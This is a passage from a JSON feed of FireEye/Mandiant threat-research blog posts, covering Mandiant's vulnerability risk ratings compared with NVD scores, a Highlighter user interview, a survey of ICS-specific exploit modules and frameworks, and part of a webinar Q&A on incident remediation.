to\n    Mandiant vulnerability ratings for the same vulnerabilities</span></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture3.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 3: Numbers of ratings at various\n    criticality tiers from NVD CVSSv3 scores compared to Mandiant\n    ratings for the same vulnerabilities</span></p>\n <h4>Mandiant Vulnerability Ratings Defined</h4>\n <p>Our rating system includes both an exploitation rating and a risk rating:</p>\n <p>The <i>Exploitation Rating</i> is an in indication of what is\n  occurring in the wild.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture4.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 4: Mandiant Exploitation Rating definitions</span></p>\n <p>The<i> Risk Rating</i> is our expert assessment of what impact an\n  attacker could have on a targeted organization, if they were to\n  exploit a vulnerability.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture5.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 5: Mandiant Risk Rating definitions</span></p>\n <p>We intentionally use the critical rating sparingly, typically in\n  cases where exploitation has serious impact, exploitation is trivial\n  with often no real mitigating factors, and the attack surface is large\n  and remotely accessible. When Mandiant uses the critical rating, it is\n  an indication that remediation should be a top priority for an\n  organization due to the potential impacts and ease of exploitation.</p>\n <p>For example, Mandiant Threat Intelligence rated CVE-2019-19781 as\n  critical due to the confluence of widespread exploitation—including by\n  APT41—the public release of proof-of-concept (PoC) code that\n  facilitated automated exploitation, the potentially acute outcomes of\n  exploitation, and the ubiquity of the software in enterprise environments.</p>\n <p>CVE-2019-19781 is a path traversal vulnerability of the Citrix\n  Application Delivery Controller (ADC) 13.0 that when exploited, allows\n  an attacker to remotely execute arbitrary code. Due to the nature of\n  these systems, successful exploitation could lead to further\n  compromises of a victim's network through lateral movement or the\n  discovery of Active Directory (AD) and/or LDAP credentials. Though\n  these credentials are often stored in hashes, they have been proven to\n  be vulnerable to password cracking. Depending on the environment, the\n  potential second order effects of exploitation of this vulnerability\n  could be severe.</p>\n <p>We described widespread exploitation of CVE-2019-19781 in our <a\n    href=\"https://www.fireeye.com/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html\">blog\n  post</a> earlier this year, including a timeline from disclosure on\n  Dec. 17, 2019, to the patch releases, which began a little over a\n  month later on Jan. 20, 2020. Significantly, within hours of the\n  release of PoC code on Jan. 10, 2020, we detected reconnaissance for\n  this vulnerability in FireEye telemetry data. Within days, we observed\n  weaponized exploits used to gain footholds in victim environments. On\n  the same day the first patches were released, Jan. 20, 2020, we <a\n  href=\"https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\">observed</a>\n  APT41, one of the most prolific Chinese groups we track, kick off an\n  expansive campaign exploiting CVE-2019-19781 and other vulnerabilities\n  against numerous targets.</p>\n <h4>Factors Considered in Ratings</h4>\n <p>Our vulnerability analysts consider a wide variety of\n  impact-intensifying and mitigating factors when rating a\n  vulnerability. Factors such as actor interest, availability of exploit\n  or PoC code, or exploitation in the wild can inform our analysis, but\n  are not primary elements in rating.</p>\n <p>\n  <i>Impact considerations</i> help determine what impact exploitation\n  of the vulnerability can have on a targeted system.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"138\" valign=\"top\"><p>\n          <b>Impact Type</b></p> </td> <td width=\"486\" valign=\"top\"><p>\n          <b>Impact Consideration</b></p> </td> </tr>\n    <tr>\n      <td width=\"138\" valign=\"top\"><p>Exploitation Consequence</p> </td>\n        <td width=\"486\" valign=\"top\"><p>The result of successful\n          exploitation, such as privilege escalation or remote code\n        execution</p> </td> </tr>\n    <tr>\n      <td width=\"138\" valign=\"top\"><p>Confidentiality Impact</p> </td>\n        <td width=\"486\" valign=\"top\"><p>The extent to which exploitation\n          can compromise the confidentiality of data on the impacted\n        system</p> </td> </tr>\n    <tr>\n      <td width=\"138\" valign=\"top\"><p>Integrity Impact</p> </td> <td\n        width=\"486\" valign=\"top\"><p>The extent to which exploitation\n          allows attackers to alter information in impacted systems</p>\n      </td> </tr>\n    <tr>\n      <td width=\"138\" valign=\"top\"><p>Availability Impact</p> </td> <td\n        width=\"486\" valign=\"top\"><p>The extent to which exploitation\n          disrupts or restricts access to data or systems</p> </td> </tr></tbody></table>\n <p>\n  <i>Mitigating factors</i> affect an attacker’s likelihood of\n  successful exploitation.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>\n          <b>Mitigating Factor</b></p> </td> <td width=\"480\" valign=\"top\"><p>\n          <b>Mitigating Consideration</b></p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Exploitation Vector</p> </td> <td\n        width=\"480\" valign=\"top\"><p>What methods can be used to exploit\n          the vulnerability?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Attacking Ease</p> </td> <td\n        width=\"480\" valign=\"top\"><p>How difficult is the exploit to use\n          in practice?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Exploit Reliability</p> </td> <td\n        width=\"480\" valign=\"top\"><p>How consistently can the exploit\n          execute and perform the intended malicious activity?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Access Vector</p> </td> <td\n        width=\"480\" valign=\"top\"><p>What type of access (i.e. local,\n          adjacent network, or network) is required to successfully\n          exploit the vulnerability?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Access Complexity</p> </td> <td\n        width=\"480\" valign=\"top\"><p>How difficult is it to gain access\n          needed for the vulnerability?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Authentication Requirements</p>\n      </td> <td width=\"480\" valign=\"top\"><p>Does the exploitation\n          require authentication and, if so, what type of\n        authentication?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Vulnerable Product Ubiquity</p>\n      </td> <td width=\"480\" valign=\"top\"><p>How commonly is the\n          vulnerable product used in enterprise environments?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Product's Targeting Value</p>\n      </td> <td width=\"480\" valign=\"top\"><p>How attractive is the\n          vulnerable software product or device to threat actors to\n        target?</p> </td> </tr>\n    <tr>\n      <td width=\"144\" valign=\"top\"><p>Vulnerable Configurations</p>\n      </td> <td width=\"480\" valign=\"top\"><p>Does exploitation require\n          specific configurations, either default or non-standard?</p>\n      </td> </tr></tbody></table>\n <h4>Mandiant Vulnerability Rating System Applied</h4>\n <p>The following are examples of cases in which Mandiant Threat\n  Intelligence rated vulnerabilities differently than NVD by considering\n  additional factors and incorporating information that either was not\n  reported to NVD or is not easily quantified in an algorithm.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"102\" valign=\"top\"><p>\n          <b>Vulnerability</b></p> </td> <td width=\"138\" valign=\"top\"><p>\n          <b>Vulnerability Description</b></p> </td> <td width=\"66\" valign=\"top\"><p>\n          <b>NVD Rating</b></p> </td> <td width=\"72\" valign=\"top\"><p>\n          <b>Mandiant Rating</b></p> </td> <td width=\"246\" valign=\"top\"><p>\n          <b>Explanation</b></p> </td> </tr>\n    <tr>\n      <td width=\"102\" valign=\"top\"><p>CVE-2019-12650</p> </td> <td\n        width=\"138\" valign=\"top\"><p>A command injection vulnerability in\n          the Web UI component of Cisco IOS XE versions 16.11.1 and\n          earlier that, when exploited, allows a privileged attacker to\n          remotely execute arbitrary commands with root\n        privileges<b></b></p> </td> <td width=\"66\"\n        valign=\"top\"><p>High</p> </td> <td width=\"72\"\n        valign=\"top\"><p>Low</p> </td> <td width=\"246\"\n          valign=\"top\"><p>This vulnerability was rated high by NVD, but\n          Mandiant Threat Intelligence rated it as low risk because it\n          requires the highest level of privileges – level 15 admin\n          privileges – to exploit. Because this level of access should\n          be quite limited in enterprise environments, we believe that\n          it is unlikely attackers would be able to leverage this\n          vulnerability as easily as others. There is no known\n          exploitation of this activity.<b></b></p> </td> </tr>\n    <tr>\n      <td width=\"102\" valign=\"top\"><p>CVE-2019-5786</p> </td> <td\n        width=\"138\" valign=\"top\"><p>A use after free vulnerability\n          within the FileReader component in Google Chrome 72.0.3626.119\n          and prior that, when exploited, allows an attacker to remotely\n          execute arbitrary code. </p> <p>\n          <b> </b></p> </td> <td width=\"66\" valign=\"top\"><p>Medium</p>\n      </td> <td width=\"72\" valign=\"top\"><p>High</p> </td> <td\n        width=\"246\" valign=\"top\"><p>NVD rated CVE-2019-5786 as medium,\n          while Mandiant Threat Intelligence rated it as high risk. The\n          difference in ratings is likely due to NVD describing the\n          consequences of exploitation as denial of service, while we\n          know of exploitation in the wild which results in remote code\n          execution in the context of the renderer, which is a more\n          serious outcome.<b></b></p> </td> </tr></tbody></table>\n <p>As demonstrated, factors such as the assessed ease of exploitation\n  and the observance of exploitation in the wild may result a different\n  priority rating than the one issued by NVD. In the case of\n  CVE-2019-12650, we ultimately rated this vulnerability lower than NVD\n  due to the required privileges needed to execute the vulnerability as\n  well as the lack of observed exploitation. On the other hand, we rated\n  the CVE-2019-5786 as high risk due to the assessed severity, ubiquity\n  of the software, and confirmed exploitation.</p>\n <p>In early 2019, Google <a\n  href=\"https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html\">reported</a>\n  two zero-day vulnerabilities were being used together in the wild:\n  CVE-2019-5786 (Chrome zero-day vulnerability) and CVE-2019-0808 (a\n  Microsoft privilege escalation vulnerability). Google quickly released\n  a patch for the Chrome vulnerability pushed it to users through\n  Chrome’s auto-update feature on March 1. CVE-2019-5786 is significant\n  because it can impact all major operating systems, Windows, Mac OS,\n  and Linux, and requires only minimal user interaction, such as\n  navigating or following a link to a website hosting exploit code, to\n  achieve remote code execution. The severity is further compounded by a\n  public <a\n    href=\"https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/\">blog\n  post</a> and proof of concept exploit code that was released a few\n  weeks later and subsequently incorporated into a Metasploit module.</p>\n <h4>The Future of Vulnerability Analysis Requires Algorithms <i>and</i>\n  Human Intelligence</h4>\n <p>We expect that the volume of vulnerabilities to continue to increase\n  in coming years, emphasizing the need for a rating system that\n  accurately identifies the most significant vulnerabilities and\n  provides enough nuance to allow security teams to tackle patching in a\n  focused manner. As the quantity of vulnerabilities grows,\n  incorporating assessments of malicious actor use, that is, observed\n  exploitation as well as the feasibility and relative ease of using a\n  particular vulnerability, will become an even more important factor in\n  making meaningful prioritization decisions.</p>\n <p>Mandiant Threat Intelligence believes that the future of\n  vulnerability analysis will involve a combination of machine\n  (structured or algorithmic) and human analysis to assess the potential\n  impact of a vulnerability and the true threat that it poses to\n  organizations. Use of structured algorithmic techniques, which are\n  common in many models, allows for consistent and transparent rating\n  levels, while the addition of human analysis allows experts to\n  integrate factors that are difficult to quantify, and adjust ratings\n  based on real-world experience regarding the actual risk posed by\n  various types of vulnerabilities.</p>\n <p>Human curation and enhancement layered on top of automated rating\n  will provide the best of both worlds: speed and accuracy. We strongly\n  believe that paring down alerts and patch information to a manageable\n  number, as well as clearly communicating risk levels with Mandiant\n  vulnerability ratings makes our system a powerful tool to equip\n  network defenders to quickly and confidently take action against the\n  highest priority issues first.</p>\n <p>Register today to hear FireEye Mandiant Threat Intelligence experts\n  discuss the latest in <a\n    href=\"https://www.brighttalk.com/webcast/7451/392772\">vulnerability\n    threats, trends and recommendations</a> in our upcoming April 30 webinar.</p>\n","descriptionType":"html","publishedDate":"Mon, 20 Apr 2020 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture1.png","linkMd5":"2331ddd6a397dc5c2678394921d236dc","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn65@2020_2/2020/08/24/14-11-05-189_df4cd2a160d78b3c.webp","destWidth":936,"destHeight":1070,"sourceBytes":291273,"destBytes":54094,"author":"Cameron Sabel","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn65@2020_2/2020/08/24/14-11-05-189_df4cd2a160d78b3c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn34@2020_2/2020/08/24/14-11-15-010_e374be0b450a898b.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn46@2020_6/2020/08/24/14-11-14-439_7f316ce121dad7af.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn48@2020_4/2020/08/24/14-11-11-972_4fc1da1989740da8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn60@2020_2/2020/08/24/14-11-12-444_8666248cf006f93b.webp"},"publishedOrCreatedDate":1598278264205},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Highlighter Super Users Series: Post 1","link":"http://www.fireeye.com/blog/threat-research/2012/11/highlighter-super-users-series-post-1.html","description":"<div class=\"c00 c00v1\"> \n <p>The <a title=\"Highlighter\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html\" target=\"_blank\">Highlighter™</a> Super Users series is a little something I've put together to reach out to the Highlighter community. As a user of this freeware tool from Mandiant, I want you to know there are many users out there who can help you get through your log analysis paralysis. This series is meant to highlight (see what I did there?) how some users have solved a various range of problems using Highlighter. These interviews will provide insight into the benefits and pitfalls of using Highlighter, some features you may not be aware of, and a few use cases you may not have considered.</p> \n <p> <b>Super User Interview #1: Ken Johnson</b></p> \n <p>Ken Johnson is one of Highlighter's Twitter-friendly users. He is a malware analyst and incident responder extraordinaire; fighting evil one keyword search at a time. Known as <a href=\"https://twitter.com/patories\" target=\"_blank\">@patories</a> on Twitter, I reached out to him and asked some questions about his experience using Highlighter.</p> \n <ol> \n  <li> <b>Name</b> <br /> Ken Johnson</li> \n  <li> <b>Realm of work</b> <br /> My primary work is focused on malware analysis and incident response. Occasionally I also do some forensics work.</li> \n  <li> <b>How did you hear about Highlighter?</b> <br /> I first saw Highlighter when I was familiarizing myself with free tools. I have used <a title=\"Memoryze\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" target=\"_blank\">Memoryze™</a> previously.</li> \n  <li> <b>Do you know of any other tools that do what Highlighter does?</b> <br /> Highlighter is the only tool I know of, and it does what I need so I haven't looked for others.</li> \n  <li> <b>How do you normally use Highlighter?</b> <br /> I use Highlighter to trim out known good traffic from proxy logs. This helps get to the unknown stuff quicker. When logs can be multiple gigabytes this is a time saver.</li> \n  <li> <b>Can you describe one scenario in which Highlighter helped you find evil and/or solve crime?</b> <br /> On more than one occasion I have used Highlighter to narrow down proxy log traffic to find connections that are malicious. There was an instance about 2 months ago where users fell for a Phish. We used Highlighter to find the C&amp;C IP's that machines kept calling home to, by filtering out what was normal and analyzing what was left. Highlighter helped find almost 50 IP/URLS that were malicious.</li> \n  <li> <b>On a scale from 1 (worst) to 5 (best), how well does Highlighter address your use case(s)?</b> <br /> I would have to give Highlighter a 4.</li> \n  <li> <b>What is missing from Highlighter for your use case(s)?</b> <br /> I would like to have the ability to whitelist traffic so I do not have to manually keep removing internal hosts that we see. This may be in the program and I have not found it.</li> \n  <li> <b>What is one Highlighter feature addition that would serve the Information Security community best?</b> <br /> I think the ability to whitelist hostnames would be a nice addition.</li> \n  <li> <b>Are you aware of, or have you used, any of the following features:</b> \n   <ul> \n    <li> <i>Activity Over Time feature that lets you view log data as a function of Entries Per Day</i> <br /> No, I was not aware of this one.</li> \n    <li> <i>Ability to change basic font settings for your output</i> <br /> I know it is there, but for my use this is never used.</li> \n   </ul> </li> \n  <li> <b>Have you ever seen Highlighter used in such a way that your eyeballs melted from all the Awesome?</b> <br /> I have only seen myself use it, but I have seen my co-workers eyeballs melt when I show them the awesomeness that they can do. Some are still stuck in the grep world...</li> \n </ol> \n <p>Keep an eye out for the second post in the <i>Highlighter Super Users Series</i> featuring Russ McRee, author of ISSA Journal's <i>toolsmith</i> series and mastermind behind <a href=\"http://www.holisticinfosec.org/\">www.holisticinfosec.org</a>. If you're interested in sharing your own experiences with this tool, please let me know by commenting below.</p> \n</div>","descriptionType":"html","publishedDate":"Fri, 16 Nov 2012 00:05:07 +0000","feedId":1226,"bgimg":"","linkMd5":"143df8c357195b1a6338d0622c99e8d9","bgimgJsdelivr":"","metaImg":"","author":"Jed Mitten","publishedOrCreatedDate":1598278264222},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Monitoring ICS Cyber Operation Tools and Software Exploit Modules To\nAnticipate Future Threats","link":"http://www.fireeye.com/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html","description":"<p>There has only been a small number of broadly documented cyber attacks targeting operational technologies (OT) / industrial control systems (ICS) over the last decade. While fewer attacks is clearly a good thing, the lack of an adequate sample size to determine risk thresholds can make it difficult for defenders to understand the threat environment, prioritize security efforts, and justify resource allocation.</p> \n<p>To address this problem, FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">Mandiant Threat Intelligence</a> produces a range of reports for <a href=\"https://www.fireeye.com/content/dam/fireeye-www/products/pdfs/pf/intel/ds-cyber-physical-threat-intelligence.pdf\">subscription</a> customers that focus on different indicators to predict future threats. Insights from activity on dark web forums, anecdotes from the field, ICS vulnerability research, and proof of concept research makes it possible to illustrate the threat landscape even with limited incident data. This blog post focuses on one of those source sets—ICS-oriented intrusion and attack tools, which will be referred to together in this post as cyber operation tools.</p> \n<p>ICS-oriented cyber operation tools refer to hardware and software that has the capability to either exploit weaknesses in ICS, or interact with the equipment in such a way that could be utilized by threat actors to support intrusions or attacks. For this blog post, we separated exploit modules that are developed to run on top of frameworks such as <a href=\"https://www.metasploit.com/\">Metasploit</a>, <a href=\"https://www.coresecurity.com/core-impact\">Core Impact</a>, or <a href=\"https://www.immunityinc.com/products/canvas/gleg-products.html\">Immunity Canvas</a> from other cyber operation tools due to their exceedingly high number.</p> \n<h4>Cyber Operation Tools Reduce the Level of Specialized Knowledge Attackers Need to Target ICS</h4> \n<p>As ICS are a distinct sub-domain to information and computer technology, successful intrusions and attacks against these systems often requires specialized knowledge, establishing a higher threshold for successful attacks. Since intrusion and attack tools are often developed by someone who already has the expertise, these tools can help threat actors bypass the need for gaining some of this expertise themselves, or it can help them gain the requisite knowledge more quickly. Alternatively, experienced actors may resort to using known tools and exploits to conceal their identity or maximize their budget.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: ICS attacker knowledge curve</span></p> \n<p>The development and subsequent adoption of standardized cyber operation tools is a general indication of increasing adversarial capability. Whether these tools were developed by researchers as proof-of-concept or utilized during past incidents, access to them lowers the barrier for a variety of actors to learn and develop future skills or custom attack frameworks. Following this premise, equipment that is vulnerable to exploits using known cyber operation tools becomes low-hanging fruit for all sorts of attackers.</p> \n<h4>ICS Cyber Operation Tool Classification</h4> \n<p>Mandiant Intelligence tracks a large number of publicly available ICS-specific cyber operation tools. The term \"ICS-specific,\" as we employ it, does not have a hard-edged definition. While the vast majority of cyber operation tools we track are clear-cut cases, we have, in some instances, considered the intent of the tool's creator(s) and the tool's reasonably foreseeable impact on ICS software and equipment. Note, we excluded tools that are IT-based but may affect OT systems, such as commodity malware or known network utilities. &nbsp;We included only a few exceptions, where we identified specialized adaptations or features that enabled the tool to interact with ICS, such as the case of nmap scripts.</p> \n<p>We assigned each tool to at least one of eight different categories or classes, based on functionality.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Table 1: Classes of ICS-specific intrusion and attack tools</span></p> \n<p>While some of the tools included in our list were created as early as 2004, most of the development has taken place during the last 10 years. The majority of the tools are also vendor agnostic, or developed to target products from some of the largest ICS original equipment manufacturers (OEM). Siemens stands out in this area, with 60 percent of the vendor-specific tools potentially targeting its products. Other tools we identified were developed to target products from Schneider Electric, GE, ABB, Digi International, Rockwell Automation, and Wind River Systems.</p> \n<p>Figure 2 depicts the number of tools by class. Of note, network discovery tools make up more than a quarter of the tools. We also highlight that in some cases, the software exploitation tools we track host extended repositories of modules to target specific products or vulnerabilities.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: ICS-specific intrusion and attack tools by class</span></p> \n<h4>Software Exploit Modules</h4> \n<p>Software exploit modules are the most numerous subcomponents of cyber operation tools given their overall simplicity and accessibility. Most frequently, exploit modules are developed to take advantage of a specific vulnerability and automate the exploitation process. The module is then added to an exploit framework. The framework works as a repository that may contain hundreds of modules for targeting a wide variety of vulnerabilities, networks, and devices. The most popular frameworks include <a href=\"https://www.metasploit.com/\">Metasploit</a>, <a href=\"https://www.coresecurity.com/core-impact\">Core Impact</a>, and <a href=\"https://www.immunityinc.com/products/canvas/gleg-products.html\">Immunity Canvas</a>. Also, since 2017, we have identified the development of younger ICS-specific exploit frameworks such as <a href=\"https://github.com/NullArray/AutoSploit\">Autosploit</a>,&nbsp;<a href=\"https://github.com/dark-lbp/isf\">Industrial Exploitation Framework</a>&nbsp;(ICSSPLOIT), and the&nbsp;<a href=\"https://github.com/w3h/isf\">Industrial Security Exploitation Framework</a>.</p> \n<p>Given the simplicity and accessibility of exploit modules, they are attractive to actors with a variety of skill levels. Even less sophisticated actors may take advantage of an exploit module without completely understanding how a vulnerability works or knowing each of the commands required to exploit it. We note that, although most of the exploit modules we track were likely developed for research and penetration testing, they could also be utilized throughout the attack lifecycle.</p> \n<p> <i>Exploit Modules Statistics</i></p> \n<p>Since 2010, Mandiant Intelligence has tracked exploit modules for the three major exploitation frameworks: <a href=\"https://www.metasploit.com/\">Metasploit</a>, <a href=\"https://www.coresecurity.com/core-impact\">Core Impact</a>, and <a href=\"https://www.immunityinc.com/products/canvas/gleg-products.html\">Immunity Canvas</a>. We currently track hundreds of ICS-specific exploit modules related to more than 500 total vulnerabilities, 71 percent of them being potential zero-days. The break down is depicted in Figure 3. Immunity Canvas currently has the most exploits due in large part to the efforts of Russian security research firm&nbsp;<a href=\"http://www.gleg.net/\">GLEG</a>.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture4b.jpg\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: ICS exploit modules by framework</span></p> \n<p>Metasploit framework exploit modules deserve particular attention. Even though it has the fewest number of modules, Metasploit is freely available and broadly used for IT penetration testing, while Core Impact and Immunity Canvas are both commercial tools. This makes Metasploit the most accessible of the three frameworks. However, it means that module development and maintenance are provided by the community, which is likely&nbsp;contributing to the lower number of modules.</p> \n<p>It is also&nbsp;worthwhile&nbsp;to&nbsp;examine the number of exploit modules by ICS product vendor. The results of this analysis are depicted in Figure 4, which displays vendors with the highest number of exploit modules (over 10).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Vendors with 10 exploit modules or more</span></p> \n<p>Figure 4 does not necessarily indicate which vendors are the most targeted, but which products have received the most attention from exploit writers. Several factors could contribute to this, including the availability of software to experiment with, general ease of writing an exploit on particular vulnerabilities, or how the vulnerability matches against the expertise of the exploit writers.</p> \n<p>Some of the vendors included in the graph have been acquired by other companies, however we tracked them separately as the vulnerability was identified prior to the acquisition. One example of this is Schneider Electric, which acquired 7-Technologies in 2011 and altered the names of their product portfolio. We also highlight that the graph solely counts exploit modules, regardless of the vulnerability exploited. Modules from separate frameworks could target the same vulnerability and would each be counted separately.</p> \n<h4>ICS Cyber Operation Tools and Software Exploitation Frameworks Bridge Knowledge and Expertise Gaps</h4> \n<p>ICS-specific cyber operation tools often released by researchers and security practitioners are useful assets to help organizations learn about ongoing threats and product vulnerabilities. However, as anything publicly available, they can also lower the bar for threat actors that hold an interest in targeting OT networks. Although successful attacks against OT environments will normally require a high level of skills and expertise from threat actors, the tools and exploit modules discussed in this post are making it easier to bridge the knowledge gap.</p> \n<p>Awareness about the proliferation of ICS cyber operation tools should serve as an important risk indicator of the evolving threat landscape. These tools provide defenders with an opportunity to perform risk assessments in test environments and to leverage aggregated data to communicate and obtain support from company executives. Organizations that do not pay attention to available ICS cyber operation tools risk becoming low-hanging fruit for both sophisticated and unexperienced threat actors exploring new capabilities.</p> \n<p>FireEye Intelligence customers have access to the full list and analysis of ICS cyber operation tools and exploit modules. Visit our website to learn more about the <a href=\"https://www.fireeye.com/content/dam/fireeye-www/products/pdfs/pf/intel/ds-cyber-physical-threat-intelligence.pdf\">FireEye Mandiant Cyber Physical Threat Intelligence subscription</a>.</p>","descriptionType":"html","publishedDate":"Mon, 23 Mar 2020 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture1.png","linkMd5":"43b6cefaab70fd621fce2ee5a4452d07","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn61@2020_6/2020/08/24/14-11-04-875_19148ac5a0203044.webp","destWidth":974,"destHeight":499,"sourceBytes":99565,"destBytes":20216,"author":"Jeffrey Ashcraft","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn61@2020_6/2020/08/24/14-11-04-875_19148ac5a0203044.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn18@2020_6/2020/08/24/14-11-12-864_8f1a1c1143acc5ae.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn23@2020_6/2020/08/24/14-11-14-002_1d99d2ef1807506e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture4b.jpg":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn41@2020_5/2020/08/24/14-11-15-575_a6257b57a16a779d.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn88@2020_6/2020/08/24/14-11-11-477_99fc6af7cc1972a2.webp"},"publishedOrCreatedDate":1598278264186},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Q&amp;A Webinar Follow-Up - State of the Hack: Back to the Remediation","link":"http://www.fireeye.com/blog/threat-research/2013/06/qa-webinar-followup-state-hack-remediation.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>As a follow-up to our recently held <b>State of the Hack: Back to the Remediation </b>webinar, questions answered by presenter Jim Aldridge are listed below.&nbsp;</i></p> \n <ol> \n  <li> <b>How do you develop a business case for resources for security incident management, remediation, and log analysis?</b> <br /> This is an area with which many organizations that have not experienced an incident struggle with. I would recommend conducting a realistic incident simulation to exercise the organization's incident response plan. This should go beyond a table-top exercise and actually test responders' capabilities to use logs to identify and track attacker activity. This approach should provide the organization a good understanding of weaknesses in these areas. For example, I assisted a bank with planning and executing this type of exercise. They were concerned about targeted threats and had never experienced a security breach. After a series of meetings to better understand their environment, we designed a scenario based on an incident we had worked on in the past. In their scenario, picture a blank screen with a SQL Server and a question mark on it. We would give them a clue, and then we would on and say, \"Okay, so what would you do if you got this information?\" And then we provided a little bit more of the diagram. It was in the style of a choose your own adventure.</li> \n  <li> <b>During incident response what tools do you use for networking indicators; are any of them open source?</b> <br /> Typically, we like to deploy our network sensors, which we don't offer as a standalone product at this time. That intelligence is only available as part of our <a target=\"_blank\" href=\"https://www.mandiant.com/products/managed-defense/\">Managed Defense™</a> service, in large part due to the back end processing that's involved. I would categorize those as proprietary. They do a lot for us, but we also leverage whatever the client has in place.<br /> <span style=\"color: rgb(255,255,255);\">t</span> <br /> Sources of helpful information include:\n   <ul> \n    <li>Firewall logs (established connection information)</li> \n    <li>DNS logs (which host resolved a given domain name at a given time)</li> \n    <li>NetFlow (connection information)</li> \n   </ul> <p>One of the more mature security organizations that I've worked an incident with has a particularly effective network monitoring set up. They collect NetFlow information from across the environment. This enables them to rapidly identify lateral movement.</p> </li> \n  <p>&nbsp;</p> \n  <li> <b>Is the Mandiant incident response tool available to the public?</b> <br /> <a target=\"_blank\" href=\"https://www.mandiant.com/products/mandiant-platform/intelligent-response\">Mandiant for Intelligent Response®</a> is a commercial product. As I mentioned, <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline™</a> is a free tool that I encourage you to take a look at. It is very similar to MIR in terms of the capabilities on individual hosts, but it's designed to be executed against one host versus an enterprise.</li> \n  <li> <b>What are your thoughts on best countermeasures against pass the hash tactics?</b> <br /> It is most important to prevent the attacker from getting access to that hash in the first place. That's one reason why I like application whitelisting so much, particularly on domain controllers, because this can prevent even a domain admin from running the hash dumper. Unfortunately, once the attacker has that hash, it's not good. Another strategy is to reduce the number of places where an attacker could readily obtain privileged users' hashes. First, privileged users should operate with 